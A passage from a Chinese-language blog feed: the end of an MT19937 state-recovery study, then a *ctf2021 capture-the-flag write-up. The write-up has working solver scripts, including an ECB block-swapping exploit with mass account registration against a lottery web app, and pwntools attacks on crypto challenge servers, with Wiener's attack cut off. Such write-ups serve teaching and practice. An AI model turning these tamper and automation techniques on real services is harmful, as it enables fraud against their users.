<span class="keyword">for</span> i <span class="keyword">in</span> range(bits // shift):</span><br><span class="line">            tmp = value ^ tmp &lt;&lt; shift</span><br><span class="line">        <span class="keyword">return</span> tmp</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">LeftXorMasked</span>(<span class="params">self,value, shift, mask,bits=<span class="number">32</span></span>):</span></span><br><span class="line">        tmp = value</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(bits // shift):</span><br><span class="line">            tmp = value ^ tmp &lt;&lt; shift &amp; mask</span><br><span class="line">        <span class="keyword">return</span> tmp</span><br></pre></td></tr></table></figure><h3 id="2-逆向Twist"><a href="#2-逆向Twist" class="headerlink" title="2.逆向Twist"></a>2.逆向Twist</h3><p>观察<code>twist</code>函数，可知新的<code>state[i]</code>只和原来的<code>state[i]</code>、<code>state[i+1]</code>与<code>state[i+397]</code>有关，首先异或掉<code>state[i+397]</code>，之后我们讨论是否将结果与<code>0x9908b0df</code>异或，因为<code>0x9908b0df=0b10011001000010001011000011011111</code>，又因为<code>y&gt;&gt;1</code>操作得知之前的数的高位一定是<code>0</code>，所以我们之间判断最高位即可知道是否需要异或<code>0x9908b0df</code>，也就是能得知原来<code>state[i]</code>的最高位，那么再对<code>state[i-1]</code>进行还原，即可得到完整的<code>state[i]</code>了，具体代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">backtrace</span>(<span class="params">cur</span>):</span></span><br><span class="line">    high = <span class="number">0x80000000</span></span><br><span class="line">    low = <span class="number">0x7fffffff</span></span><br><span class="line">    mask = <span class="number">0x9908b0df</span></span><br><span class="line">    state = cur</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">623</span>,<span class="number">-1</span>,<span class="number">-1</span>):</span><br><span class="line">        tmp = state[i]^state[(i+<span class="number">397</span>)%<span class="number">624</span>]</span><br><span class="line">        <span class="comment"># recover Y(tmp)</span></span><br><span class="line">        <span class="keyword">if</span> tmp &amp; high == high:</span><br><span class="line">            tmp ^= mask</span><br><span class="line">            tmp &lt;&lt;= <span class="number">1</span></span><br><span class="line">            tmp |= <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            tmp &lt;&lt;=<span class="number">1</span></span><br><span class="line">        <span class="comment"># recover highest bit</span></span><br><span class="line">        res = tmp&amp;high</span><br><span class="line">        <span class="comment"># recover other 31 bits</span></span><br><span class="line">        tmp = state[i<span class="number">-1</span>]^state[(i+<span class="number">396</span>)%<span class="number">624</span>]</span><br><span class="line">        <span class="comment"># recover Y(tmp)</span></span><br><span class="line">        <span class="keyword">if</span> tmp &amp; high == high:</span><br><span class="line">            tmp ^= mask</span><br><span class="line">            tmp &lt;&lt;= <span class="number">1</span></span><br><span class="line">            tmp |= <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            tmp &lt;&lt;=<span class="number">1</span></span><br><span class="line">        res |= (tmp)&amp;low</span><br><span class="line">        state[i] = res    </span><br><span class="line">    <span class="keyword">return</span> state</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;A-study-for-MT19937&quot;&gt;&lt;a href=&quot;#A-study-for-MT19937&quot; class=&quot;headerlink&quot; title=&quot;A study for MT19937&quot;&gt;&lt;/a&gt;A study for MT19937&lt;/h1&gt;&lt;p&gt;寒假前被一个伪随机数卡了，终于有时间来看看&lt;/p&gt;</summary>
    
    
    
    <category term="Crypto" scheme="http://example.com/categories/Crypto/"/>
    
    
    <category term="Crypto" scheme="http://example.com/tags/Crypto/"/>
    
  </entry>
  
  <entry>
    <title>Write up for *ctf2021</title>
    <link href="http://example.com/2021/01/19/Wp_for_%E6%98%9Fctf&#39;s_crypto/"/>
    <id>http://example.com/2021/01/19/Wp_for_%E6%98%9Fctf&#39;s_crypto/</id>
    <published>2021-01-19T05:57:11.000Z</published>
    <updated>2021-03-11T01:20:12.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="WP-for-ctf2021"><a href="#WP-for-ctf2021" class="headerlink" title="WP for *ctf2021"></a>WP for *ctf2021</h1><p>第一次和V&amp;N的师傅们打比赛就冲到了第六，好耶！</p><p>最后没AK，不好（悲）</p><a id="more"></a><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="lottery-again"><a href="#lottery-again" class="headerlink" title="lottery again"></a>lottery again</h3><p>看源码，找关键代码</p><p>加密部分</p><p><img src="https://i.loli.net/2021/01/19/ouXmL1yckdJHZzE.png" alt="29.png"></p><p>解密部分</p><p><img src="https://i.loli.net/2021/01/19/DpU1AXfdM6HBFQE.png" alt="30.png"></p><p>兑换彩票部分</p><p><img src="https://i.loli.net/2021/01/19/21UeVbGj9Cn6haf.png" alt="31.png"></p><p>分析函数可以发现在兑换彩票的时候，会对彩票密文进行解码，通过解码得到的彩票lottery内容从数据库中找到对应数据，取得可兑换的coin数量，并把coin加到解码得到的user账号的硬币中。</p><p>分析代码可知，从密文中取得的user账号没有与在数据库中的信息进行验证，故如果我们可以篡改密文中对应的user信息，那么就可以让a用户购买的彩票，给b用户使用，从而让b用户达到白嫖的目的。</p><p>我们发现加密方式为MCRYPT_RIJNDAEL_256，ECB模式，通过手动测试发现该算法的分组方式为32字节为一组，在这样的前提下，我们可以尝试替换储存在其中的user数据。</p><p>以下来逐步分析如何替换全部user-uuid信息</p><p>我们已有的密文数据是：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;lottery&quot;:&quot;b52d5239-24a5-4627-b</span><br><span class="line">a46-58a00645c3e4&quot;,&quot;user&quot;:&quot;111111</span><br><span class="line">11-1111-1111-1111-111111111111&quot;,</span><br><span class="line">&quot;coin&quot;:1&#125;</span><br></pre></td></tr></table></figure><p>和</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;lottery&quot;:&quot;demodemo-demo-demo-d</span><br><span class="line">emo-demodemodemo&quot;,&quot;user&quot;:&quot;222222</span><br><span class="line">22-2222-2222-2222-222222222222&quot;,</span><br><span class="line">&quot;coin&quot;:1&#125;</span><br></pre></td></tr></table></figure><p>如下为一个加密数据的明文内容，每一行的长度为0x20（除最后一行外</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;lottery&quot;:&quot;b52d5239-24a5-4627-b</span><br><span class="line">a46-58a00645c3e4&quot;,&quot;user&quot;:&quot;111111</span><br><span class="line">11-1111-1111-1111-111111111111&quot;,</span><br><span class="line">&quot;coin&quot;:1&#125;</span><br></pre></td></tr></table></figure><p>我们想要把其替换为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;lottery&quot;:&quot;b52d5239-24a5-4627-b</span><br><span class="line">a46-58a00645c3e4&quot;,&quot;user&quot;:&quot;222222</span><br><span class="line">22-2222-2222-2222-222222222222&quot;,</span><br><span class="line">&quot;coin&quot;:1&#125;</span><br></pre></td></tr></table></figure><p>也就是把user信息都从1替换成2 但是我们只可以替换其中的任何一个一行的内容，才不会造成解密错误。于是我们自然可以考虑替换第三行的内容，其标志着该彩票购买者的部分uuid信息。但是由于只是部分uuid信息，所以即使替换了也是如下情况：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;lottery&quot;:&quot;b52d5239-24a5-4627-b</span><br><span class="line">a46-58a00645c3e4&quot;,&quot;user&quot;:&quot;111111</span><br><span class="line">22-2222-2222-2222-222222222222&quot;,</span><br><span class="line">&quot;coin&quot;:1&#125;</span><br></pre></td></tr></table></figure><p>其user信息中的前六个字节无法被替换，由于六字节内容过长，不适合用爆破的方法来绕过。 但是如果我们考虑要把前六字节的信息也要替换的话，那么必须同时替换那一行的全部内容，也就是就会变成以下情况：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;lottery&quot;:&quot;b52d5239-24a5-4627-b</span><br><span class="line">emo-demodemodemo&quot;,&quot;user&quot;:&quot;222222</span><br><span class="line">22-2222-2222-2222-222222222222&quot;,</span><br><span class="line">&quot;coin&quot;:1&#125;</span><br></pre></td></tr></table></figure><p>也就是会造成lottery信息被替换，这会造成该彩票无法从数据库中读取到，直接报错。 最终考虑到以下构造：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;lottery&quot;:&quot;b52d5239-24a5-4627-b</span><br><span class="line">a46-58a00645c3e4&quot;,&quot;user&quot;:&quot;111111</span><br><span class="line">emo-demodemodemo&quot;,&quot;user&quot;:&quot;222222</span><br><span class="line">22-2222-2222-2222-222222222222&quot;,</span><br><span class="line">&quot;coin&quot;:1&#125;</span><br></pre></td></tr></table></figure><p>由于在php在json_decode的时候，后面的user会覆盖前面的user，也就是正确的user可以覆盖错误的user，成功修改user信息。</p><p>其他部分就是，需要注册、登录、购买、彩票、兑换彩票，可以写个脚本使其自动化。代码中的target为最终要用于购买flag的账号的一个彩票密文数据。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">url = <span class="string">&quot;http://52.149.144.45:8080&quot;</span></span><br><span class="line">req = requests.session()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getheaders</span>():</span></span><br><span class="line">    <span class="keyword">return</span> &#123;<span class="string">&quot;Cookie&quot;</span> : <span class="string">&quot;api_token=&quot;</span> + token&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">reg</span>(<span class="params">user, pwd</span>):</span></span><br><span class="line">    text = req.post(url + <span class="string">&quot;/user/register&quot;</span>, data=&#123;<span class="string">&quot;username&quot;</span>: user, <span class="string">&quot;password&quot;</span>: pwd&#125;).text</span><br><span class="line">    data = json.loads(text)</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span>(<span class="params">user, pwd</span>):</span></span><br><span class="line">    text = req.post(url + <span class="string">&quot;/user/login&quot;</span>, data=&#123;<span class="string">&quot;username&quot;</span>: user, <span class="string">&quot;password&quot;</span>: pwd&#125;).text</span><br><span class="line">    data = json.loads(text)</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">buy</span>(<span class="params">token</span>):</span></span><br><span class="line">    text = req.post(url + <span class="string">&quot;/lottery/buy&quot;</span>, data=&#123;<span class="string">&quot;api_token&quot;</span>: token&#125;).text</span><br><span class="line">    data = json.loads(text)</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hijack</span>(<span class="params">enc, enc2</span>):</span></span><br><span class="line">    enc = base64.b64decode(enc)</span><br><span class="line">    enc2 = base64.b64decode(enc2)</span><br><span class="line">    <span class="keyword">return</span> enc[:<span class="number">0x40</span>] + enc2[<span class="number">0x20</span>:<span class="number">0x60</span>] + enc[<span class="number">0x60</span>:]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getInfo</span>(<span class="params">enc</span>):</span></span><br><span class="line">    text = req.post(url + <span class="string">&quot;/lottery/info&quot;</span>, data=&#123;<span class="string">&quot;enc&quot;</span>: enc&#125;).text</span><br><span class="line">    data = json.loads(text)</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">charge</span>(<span class="params">user, coin, enc</span>):</span></span><br><span class="line">    text = req.post(url + <span class="string">&quot;/lottery/charge&quot;</span>, data=&#123;<span class="string">&quot;user&quot;</span>: user, <span class="string">&quot;enc&quot;</span> : enc, <span class="string">&quot;coin&quot;</span> : coin&#125;).text</span><br><span class="line">    data = json.loads(text)</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line">target = <span class="string">&#x27;***************jjXj40HxYWzD7/wbbu6LB8hKIgHzspmlNP0zCwC07w6uK7rCLP2MvVoq8P2oXt+OoD1NY2Ba5J5Hs1AiZkdxBRIrTSq9H8y2BmPiCmO6fH2d9eJW+rk8BfTg14RVjLwF1pW5cSqW2FXVyWb0j5c8edRkKKGE=&#x27;</span></span><br><span class="line">uuid = getInfo(target)[<span class="string">&#x27;info&#x27;</span>][<span class="string">&#x27;user&#x27;</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1000</span>):</span><br><span class="line">    reg_data = reg(<span class="string">&#x27;wjhflag&#x27;</span> + str(i), <span class="string">&#x27;123456&#x27;</span>)</span><br><span class="line">    login_data = login(<span class="string">&#x27;wjhflag&#x27;</span> + str(i), <span class="string">&#x27;123456&#x27;</span>)</span><br><span class="line">    token = login_data[<span class="string">&#x27;user&#x27;</span>][<span class="string">&#x27;api_token&#x27;</span>]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">3</span>):</span><br><span class="line">        buy_data = buy(token)</span><br><span class="line">        enc = buy_data[<span class="string">&#x27;enc&#x27;</span>]</span><br><span class="line">        fake_enc = base64.b64encode(hijack(enc, target))</span><br><span class="line">        data = charge(uuid, <span class="number">0</span>, fake_enc)</span><br><span class="line">        print(data)</span><br></pre></td></tr></table></figure><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="GuessKey"><a href="#GuessKey" class="headerlink" title="GuessKey"></a>GuessKey</h3><p>憨憨出题人把key给出来了，<del>猜</del>（复制）数字</p><h3 id="GuessKey2"><a href="#GuessKey2" class="headerlink" title="GuessKey2"></a>GuessKey2</h3><p>GuessKey_fix <del>其实就是不给key了</del></p><p>先分析题目，看起来是要让我们去猜这个<code>key</code>，但显然不可能成功</p><p>接着看下面发现我们每次可以给服务器发送一个<code>mask</code>，来对这个<code>key</code>进行改变，而改变的位置是<code>key</code>中<code>0</code>所在的位置随机选两个的区间来与<code>mask</code>异或，那么也就是说，每次选取的起止位置都是<code>0</code>，那么也就是说每一次的<code>mask</code>都会影响到这两个<code>0</code></p><p>我们选择<code>mask</code>每一次都打<code>1</code>，这样每次的这两个<code>0</code>都会被异或成<code>1</code>（虽然有些地方也变成了<code>0</code>），但是相较于上一个状态，<code>0</code>的区间是被缩小了的，也就是说，在有限次的<code>mask</code>处理过后，<code>key</code>会变成<code>0b1111111111111111111111111111111111111111111111111111111111111111</code>，所以我们每次的<code>guess</code>就可以作为检测，当我们得到<code>Nice.</code>时，也就可以得知此时的<code>key</code>是<code>0b1111111111111111111111111111111111111111111111111111111111111111</code>，相当于<code>key</code>已知，和<code>GuessKey</code>就变成了一道题</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&quot;52.163.228.53&quot;</span>, <span class="string">&quot;8082&quot;</span>)</span><br><span class="line">turn = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    turn += <span class="number">1</span></span><br><span class="line">    r.recvuntil(<span class="string">&quot;mask:&quot;</span>)</span><br><span class="line">    r.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">&quot;guess:&quot;</span>)</span><br><span class="line">    r.sendline(<span class="string">&#x27;18446744073709551615&#x27;</span>)</span><br><span class="line">    back = r.recvline(<span class="literal">False</span>)</span><br><span class="line">    print(turn,back)</span><br><span class="line">    <span class="keyword">if</span>(back == <span class="string">b&#x27;Nice.&#x27;</span>):</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">2</span>):</span><br><span class="line">    r.recvuntil(<span class="string">&quot;mask:&quot;</span>)</span><br><span class="line">    r.sendline(<span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">&quot;guess:&quot;</span>)</span><br><span class="line">    r.sendline(<span class="string">&#x27;18446744073709551615&#x27;</span>)</span><br><span class="line">    back = r.recvline(<span class="literal">False</span>)</span><br><span class="line">    print(turn,back)</span><br><span class="line"></span><br><span class="line">flag = r.recvline(<span class="literal">False</span>)</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure><h3 id="MyEnc"><a href="#MyEnc" class="headerlink" title="MyEnc"></a>MyEnc</h3><p>这个题把<code>flag</code>当成<code>key</code>，对于我们给出的每个数字根据<code>key</code>的接下来6位对<code>iv</code>进行操作，因为我们已知<code>flag</code>的格式为<code>*CTF&#123;...&#125;</code>，所以我们对于<code>key</code>的前几十位是已知的，所以可以通过前几次操作来得到我们想要的东西</p><p>因为返回的值是 $iv+(m ⊕ q)^{i^{i^i}}$ ，我们简记为 $iv+(m⊕q)^{x}$ ，那么我们可以两次令<code>m</code>为0，得到数的即为 $iv+q^x$ 与 $iv+q^y$ ，可知 $q = gcd(n,(iv+q^x)-(iv+q^y))$ ，那么<code>n</code>就可以被轻松分解</p><p>接着我们可以令<code>m</code>等于<code>q</code>，这样就可以得到<code>iv</code></p><p>接下来再令<code>m</code>等于0（其实等于几都能算，等于0方便点而已），由于<code>iv</code>、<code>q</code>全部已知，而且状态不超过 $2^7$ ，即可爆破状态，即为此时的6位<code>key</code></p><p>手动补全前几位的<code>key</code>，然后不断通过爆破得到接下来的6位<code>key</code>，当<code>key</code>的长度达到120时，前120位即为<code>flag</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">table = <span class="string">&#x27;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27;</span></span><br><span class="line">r = remote(<span class="string">&quot;52.163.228.53&quot;</span>, <span class="string">&quot;8081&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">passpow</span>():</span></span><br><span class="line">rev = r.recvuntil(<span class="string">&quot;sha256(xxxx+&quot;</span>)</span><br><span class="line">suffix = r.recv(<span class="number">16</span>).decode()</span><br><span class="line">r.recvuntil(<span class="string">&quot; == &quot;</span>)</span><br><span class="line">res = r.recv(<span class="number">64</span>).decode()</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">f</span>(<span class="params">x</span>):</span></span><br><span class="line">hashresult = hashlib.sha256((x+suffix).encode()).hexdigest()</span><br><span class="line"><span class="keyword">if</span> hashresult == res:</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">prefix = util.iters.mbruteforce(f,table,<span class="number">4</span>,<span class="string">&#x27;upto&#x27;</span>)</span><br><span class="line">r.recvuntil(<span class="string">&quot;Give me xxxx:&quot;</span>)</span><br><span class="line">r.sendline(str(prefix))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">talk</span>(<span class="params">x</span>):</span></span><br><span class="line">r.recvuntil(<span class="string">&quot;give me a number:\n&quot;</span>)</span><br><span class="line">r.sendline(str(x))</span><br><span class="line">r.recvuntil(<span class="string">&quot;done: &quot;</span>)</span><br><span class="line"><span class="keyword">return</span> int(r.recvline(<span class="literal">False</span>).strip().decode())</span><br><span class="line"></span><br><span class="line">passpow()</span><br><span class="line">print(<span class="string">&#x27;Successfully pass the pow!&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">&quot;n: &quot;</span>)</span><br><span class="line">n = int(r.recvline(<span class="literal">False</span>).strip().decode())</span><br><span class="line">print(n)</span><br><span class="line"></span><br><span class="line">a = talk(<span class="number">0</span>)</span><br><span class="line">b = talk(<span class="number">0</span>)</span><br><span class="line">delta = b+n-a</span><br><span class="line"></span><br><span class="line">q = gcd(delta,n)</span><br><span class="line"><span class="keyword">assert</span> q != <span class="number">1</span></span><br><span class="line">p = n // q</span><br><span class="line"><span class="keyword">assert</span> p * q == n</span><br><span class="line"></span><br><span class="line">iv = talk(q)</span><br><span class="line"></span><br><span class="line">phi = (p<span class="number">-1</span>) * (q<span class="number">-1</span>)</span><br><span class="line">elist = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">8</span>):</span><br><span class="line">elist.append(pow(i,pow(i,i,phi),phi))</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;001010100100001101010&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (len(flag)&lt;<span class="number">120</span>):</span><br><span class="line">delta = talk(<span class="number">0</span>) - iv</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">128</span>):</span><br><span class="line">tmp = bin(i)[<span class="number">2</span>:].rjust(<span class="number">7</span>,<span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">res = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(len(tmp)):</span><br><span class="line"><span class="keyword">if</span>(tmp[j] == <span class="string">&#x27;1&#x27;</span>):</span><br><span class="line">res += pow(q,elist[j],n)</span><br><span class="line">res %= n</span><br><span class="line"><span class="keyword">if</span>(delta%n == res):</span><br><span class="line">flag += bin(i)[<span class="number">2</span>:].rjust(<span class="number">7</span>,<span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">print(bin(i)[<span class="number">2</span>:].rjust(<span class="number">7</span>,<span class="string">&#x27;0&#x27;</span>))</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">flag = flag[:<span class="number">120</span>]</span><br><span class="line">print(flag)</span><br><span class="line">flag = long_to_bytes(int(flag,<span class="number">2</span>))</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure><h3 id="little-case"><a href="#little-case" class="headerlink" title="little case"></a>little case</h3><p>题目分为两部分，一个是<code>little_trick</code>，一个是<code>real_trick</code></p><p>阅读代码后发现<code>little_trick</code>就是<code>RSA</code>的<code>wiener attack</code>，最后即可分解<code>n</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">n1 = <span class="number">21669699875387343975765484834175962461348837371447024695458479154615348697330944566714587217852888702291368306637977095490953192701450127798670425959768118384915082017373951315699899009631834471691811815393784748930880954114446745814058132752897827717077886547911476575751254872623927783670252969995075629255541621917767501261249192653546875104532649043219697616464205772025267019328364349763854659490144531087349974469079255236823096415094552037488277752927579909539401311624671444833332618177513356173537573280352724384376372955100031534236816681805396608147647003653628203258681097552049114308367967967184116839561</span></span><br><span class="line">p1 = <span class="number">125457275769068125757485908164006976153846494199951055956773829512867658202991509882220598391130551501414264867302691498062034690987771420463818096949614464177297177742292221196272475473441901790650971196178740160270878352307469807794533558079725928555246759355468676092854618354193968504322694550607414849887</span></span><br><span class="line">q1 = <span class="number">172725732665160218766764654273481422951178250693790825716359642314019315013321867434849375780994146440118500992456863730311444752367847389052666095324149584230474450693683416636565463345342017830651196454735159385924736453857045827989347928771104006978412412405607299616293396656259291378061505961429915687703</span></span><br><span class="line">e1 = <span 